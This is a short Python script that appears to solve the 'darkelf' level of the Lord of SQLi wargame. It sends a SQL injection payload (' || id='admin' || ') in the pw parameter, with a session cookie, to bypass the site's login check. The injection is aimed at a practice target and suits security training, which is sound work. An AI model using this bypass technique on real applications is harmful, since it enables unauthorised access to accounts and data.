import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php"
cookies = {'PHPSESSID': session_id}

params = {
    'pw': "' || id='admin' || '"
}
response = requests.get(url, params=params, cookies=cookies)
print_html(response.text)
